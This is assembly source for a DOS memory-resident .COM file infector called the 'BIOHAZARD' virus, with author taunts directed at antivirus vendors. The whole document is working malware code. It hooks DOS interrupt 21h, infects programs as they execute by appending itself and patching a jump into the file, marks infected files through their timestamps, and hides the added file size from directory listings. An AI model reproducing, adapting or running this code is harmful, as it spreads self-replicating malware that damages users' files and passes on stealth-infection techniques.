virus           segment
		assume  cs:virus,ds:virus,es:nothing
	      
	org     100h
start:  db      0E9h,02,00,90h,90h ; Jmp to vstart

vstart  equ     $                
	call    code_start      ; call codie_startie
code_start:          
	pop     si
	sub     si,offset code_start ; so we can use the lea command etc
	jmp     code_continue

	db      '!BIOHAZARD!' ; Lil' poem (?)
	db      'U Found ME!' ; of mine

code_continue:
	mov     bp,si           ; Now, put bp in si instead so bp's used
	jmp     load            ; Jmp and go resident

old_21  dd      ?               ; Old int21 interrupt saved here

new_21:                         ; Our own, new one int21
	cmp     ax,4b00h        ; Is a file being executed
	je      exec1           ; If so, damn it! INFECT!
	
dir_thang:
	cmp     ah,11h          ; Find first
	je      hide_size       ; Use stealth
	cmp     ah,12h          ; Find next
	je      hide_size       ; Use stealth
	cmp     ax,3030h        ; Another copy trying to go resident?
	jne     do_old          ; If not, do the old int21 thang
	mov     bx,3030h        ; Show that we're already resident
do_old: jmp     dword ptr cs:[(old_21-vstart)]  ; Jmp old int21
exec1:  jmp     exec                            ; Try to infect
do_dir: jmp     dword ptr cs:[(old_21-vstart)]  ; See do_old
	ret                                     ; But return back

hide_size:
	pushf
	push    cs
	call    do_dir                          ; get FCB (current)
	cmp     al,00h                          ; Is DIR being used (?)
	jz      undocumented_get_FCB            ; If so, go on
	jmp     dir_error                       ; If not, get the fuck
						; outa this place man
undocumented_get_FCB:
	push    ax                              ; push
	push    bx                              ; push
	push    es                              ; push (gaak! no pops)
	mov     ah,51h                          ; get FCB (location)
	int     21h                             ; figure it out
	mov     es,bx                           ; get FCB (info)
	cmp     bx,es:[16h]                     ; check it
	je      fix_it_up                       ; if so, move on
	jmp     not_inf

fix_it_up:
	mov     bx,dx                           ; fixup
	mov     al,[bx]                         ; some
	push    ax                              ; shit
	mov     ah,2fh                          ; get the DTA
	int     21h                             ; yeah, you do that
	pop     ax                              ; atlast, pop me babe
	inc     al                              ; check FCB (extended)
	jz      add_it                          ; ok, move on
	jmp     normal_fcb                      ; jmp normal_fcb

add_it:
	add     bx,7h                           ; yes, add it.. go ahead
normal_fcb:
	mov     ax,es:[bx+17h]
	and     ax,1fh
	xor     al,01h                          ; are the file's seconds
	jz      go_on_and_do_it_strong          ; equal to "2"?
	jmp     not_inf                         ; If so, outa here
	
go_on_and_do_it_strong:
	and     byte ptr es:[bx+17h],0e0h       ; subtract the size
	sub     es:[bx+1dh],(vend-vstart)       ; how much? (*.*)
	sbb     es:[bx+1fh],ax                  ; yet another stealthed
not_inf:pop     es                              ; we will..
	pop     bx                              ; we will..
	pop     ax                              ; pop you! pop you!
	
dir_error:   
	iret                                    ; return to the one who
						; called this thang
exec:   
	push    ax                              ; push the stuff needed
	push    bx                              ; (as normally)
	push    cx
	push    dx
	push    di
	push    si
	push    ds
	push    es

infect: 
	mov     ax,3d02h                        ; Open the file being
	int     21h                             ; executed do that!
	jc      fuckitall                       ; If error, get the fuck
						; out!
	
	xchg    ax,bx                           ; or.. mov bx,ax
		
	push    ds                              ; pusha
	push    cs                              ; push
	pop     ds                              ; pop!

	mov     ah,3fh                          ; Read from file
	mov     dx,(buffer-vstart)              ; put in our buffer
	mov     cx,5h                           ; how much to read
	int     21h                             ; do that
	jc      fuckitall                       ; If error, fuck it!
	

	cmp     word ptr cs:[(buffer-vstart)],5A4Dh ; Is it an .EXE?
	je      fuckitall                           ; If so, outa here..

	cmp     word ptr cs:[(buffer-vstart)],4D5Ah ; The other form?
	je      fuckitall                           ; (can be MZ or ZM)
						    ; If so, outa here
	cmp     word ptr cs:[(buffer-vstart)+3],9090h ; Ok, is it
	je      fuckitall                           ; infect? If so,
						    ; outa here
	jmp     next                                ; Move on..

fuckitall:
	jmp     homey2                              ; Something screwed,
						    ; outa dis thang..
next:   

	mov     ax,5700h                            ; Get date/time
	int     21h                                 ; int me baaaabe!

	mov     word ptr cs:[(old_time-vstart)],cx  ; save time
	mov     word ptr cs:[(old_date-vstart)],dx  ; save date
 
	mov     ax,4202h                            ; ftpr to end
	mov     cx,0                                ; get ftpr (filesize)
	cwd                                         ; or.. xor dx,dx
	int     21h
	jc      fuckitall                           ; if error, fuck it!
	mov     cx,ax                               ; mov cx to ax
	sub     cx,3                                ; for the jmp
	jmp     save_rest_of_len
	db      'BIOHAZARD VIRUS - INV. EVIL ALTER - THE Wêí$àL!'

save_rest_of_len:
	mov     word ptr cs:[(jump_add+1-vstart)],cx ; save jmp length

	mov     ah,40h                              ; write to file
	mov     cx,(vend-vstart)                    ; the virus
	cwd                                         ; from start
	int     21h                                 ; atlast the fun part
	jnc     fpointer                            ; no error(s), go on
	jc      homey                               ; fuck it!

fpointer:
	mov     ax,4200h                            ; move file pointer
	mov     cx,0                                ; to the beginning
	cwd
	int     21h


	mov     ah,40h                              ; write the JMP the
	mov     cx, 5                               ; the file (5 bytes)
	mov     dx,(jump_add-vstart)                ; offset jump thang
	int     21h
	
	jc      homey                               ; if error, fuck it!

	mov     ax,5701h                            ; restore old
	mov     word ptr cx,cs:[(old_time-vstart)]  ; date/time
	mov     word ptr dx,cs:[(old_date-vstart)]
	
	and     cl,0e0H                             ; chance the file's
	inc     cl                                  ; seconds to "2" for
	int     21h                                 ; stealth "marker"
	

	mov     ah,3eh                              ; close thisone
	int     21h


homey: jmp     homey2                               ; outa here
       db      ' HEY HEY TO ALL A/V LAMERS!! HA!'   ; dedication note

homey2: pop     ds                                  ; pop
	pop     es                                  ; pop
	pop     ds                                  ; pop
	pop     si                                  ; pop
	pop     di                                  ; pop
	pop     dx                                  ; pop
	pop     cx                                  ; pop
	pop     bx                                  ; pop
	pop     ax                                  ; new virus-name
						    ; popcorn virus?
	jmp    dword ptr cs:[(old_21-vstart)]       ; heading for old
						    ; int21
old_date dw     0                                   ; date/time
old_time dw     0                                   ; saving place


buffer: db      0cdh,20h,00                         ; our lil' buffer
buffer2 db      0,0                                 ; plus these two
jump_add: db    0E9h,00,00,90h,90h;                 ; what we put instead
						    ; of org. jmp
exit2:  jmp     exit                                ; get outa here

load:   mov     ax,3030h                            ; Are we already in
	int     21h                                 ; this users memory
	cmp     bx,3030h                            ; well, check it!
	je      exit2                               ; if so, outa here
	

dec_here:
	push    cs                              ; push
	pop     ds                              ; pop

	mov     ah,4ah                          ; req. very much mem
	mov     bx,0ffffh                       ; ret's largest size
	int     21h

	mov     ah,4ah                          ; ok, so now we
	sub     bx,(vend-vstart+15)/16+1        ; subtract the size of
	jnc     intme                           ; of our virus. If no
	jmp     exit2                           ; error go on, else
						; fuck it
intme:
	int     21h                             ; int me! int me!

	mov     ah,48h
	mov     bx,(vend-vstart+15)/16          ; req. last pages
	int     21h                             ; allocate to the virus
	jnc     decme                           ; no error, go on
	jmp     exit2                           ; les get outa dis place
	
decme:
	dec     ax                              ; oh? a dec, no push/pop
						; how glad i am :)
	push    es                              ; blurk! yet another push
	
	mov     es,ax                           ; set es to ax
	jmp     dos_own                         ; carry on comrade
	db      ' Greets to B-real!/IR '        ; greetings to our
						; latest member, a
dos_own:                                        ; friend of mine
	mov     byte ptr es:[0],'Z'             ; this memory will
	mov     word ptr es:[1],8               ; have DOS as it's
						; owner
	inc     ax                              ; opposite of dec, eh?
						; yet another new-commer
	lea     si,[bp+offset vstart]           ; copy to memory
	mov     di,0                            ; (new block) xor di,di
	jmp     copy_rest                       ; go on
	db      ' Well, The Wêíz is back, and he has an attitude!' ; lil'

copy_rest:
	mov     es,ax                           ; es as ax
	mov     cx,(vend-vstart+5)/2            ; the whole thing
	cld                                     ; bytes, clr direction
	rep     movsw
	jmp     make_res                        ; now, make it resident
	db      'Quit reading the code, yes, this is a fucking virus!'; thang
	
make_res:
	xor     ax,ax                           ; atlast!
	mov     ds,ax                           ; put all shit to memory
	push    ds                              ; don't push me around :)
	lds     ax,ds:[21h*4]                   ; vectorswapping
	jmp     swap_sect                       ; (manually!)
	db      ' Catch me, Dare ya!'           ; by Snoop 'n Dre.

swap_sect:
	mov     word ptr es:[old_21-vstart],ax   ; where's our old int21
	mov     word ptr es:[old_21-vstart+2],ds ; stored? well see here
	pop     ds
	mov     word ptr ds:[21h*4],(new_21-vstart) ; point to our virus
	mov     ds:[21h*4+2],es                     ; instead of old21

	push    cs                                  ; no cmt.
	pop     ds                                  ; to much 'bout 'em
						    ; today, eh? :)

exit:
	push    cs                                  ; no cmt.
	pop     es                                  ; see above

	mov     cx,5                                ; five bytes
	jmp     copyback                            ; keep on moving..
	db      ' The Wêí$àL!!!!'                   ; To the girl i love
copyback:                               
	mov     si,offset buffer                ; copy back org. jmp
	add     si,bp                           ; and run the org. proggy
	jmp     movdi_it                        ; yeah, les do that
	db      ' Are you done yet??? '         ; Lisa, the one and only

movdi_it:
	mov     di,100h                         ; di = 100h
	repne   movsb
	jmp     lastshit                        ; atlast, soon the end
	db      ' Fuck this, Later C:!!! '      ; Love in eternality!

lastshit:
	mov     bp,100h                         ; bp equ 100h
	jmp     bp                              ; jmp to bp (SOF)


vend    equ     $                               ; end of virus
COUNT_  dw      0
CNTR    db      2                               ; dRIVE TO NUKE FROM (c:+++)

virus        ends
	end     start
